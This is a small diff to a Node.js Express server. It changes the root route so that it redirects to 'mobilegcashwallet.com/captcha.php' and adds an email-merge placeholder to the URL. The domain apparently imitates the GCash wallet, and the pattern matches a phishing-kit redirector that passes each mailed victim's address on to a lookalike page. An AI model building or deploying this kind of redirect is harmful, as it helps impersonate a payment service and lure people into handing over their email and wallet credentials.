@@ -7,7 +7,7 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
 app.get('/', (req, res) => {
-    res.redirect('https://mobilegcashwallet.com/captcha.php');
+    res.redirect('https://mobilegcashwallet.com/captcha.php?email=[-emailuser-]');
 });
 
 app.listen(3000, () => console.log('Server running on port 3000'));
